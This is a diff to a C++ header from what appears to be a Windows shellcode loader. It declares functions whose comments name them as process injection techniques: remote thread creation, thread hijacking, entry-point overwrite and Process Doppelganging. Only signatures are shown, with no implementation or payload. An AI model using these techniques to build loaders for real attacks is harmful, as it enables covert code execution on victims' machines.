@@ -1,10 +1,14 @@
 #ifndef ABLELDR_EXECUTE_HPP
 #define ABLELDR_EXECUTE_HPP
 #include <Windows.h>
+#include "malapi.hpp"
 
-namespace execute {
-	VOID CreateRemoteThread(_In_ DWORD PID, _In_ unsigned char Shellcode[]);
-	VOID HijackEntryPoint(_In_ HANDLE pHandle, _In_ unsigned char Shellcode[]);
+namespace execute
+{
+	BOOL CreateRemoteThreadInjection(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size); // Process Injection
+	BOOL RemoteHijack(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size); // Remote Thread Hijacking
+	BOOL AddressOfEntryPoint(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size); // AddressOfEntryPoint Injection
+	BOOL Doppleganger(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size); // Process Doppleganger
 } // End of execute namespace
 
 #endif
